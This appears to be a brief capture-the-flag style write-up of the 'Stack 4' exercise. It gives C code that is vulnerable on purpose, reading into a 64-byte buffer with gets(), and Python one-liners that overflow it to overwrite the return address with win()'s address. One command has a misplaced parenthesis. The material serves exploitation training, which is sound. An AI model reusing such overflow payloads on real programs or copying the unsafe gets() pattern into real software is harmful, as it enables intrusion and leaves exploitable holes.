# Stack 4

Код:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Команди:
```
python -c "print('F' * 76") | ./stack4
objdump -x stack4 | grep win
python -c "print('F' * 76 + '\xf4\x83\x04\x08')" | ./stack4
```
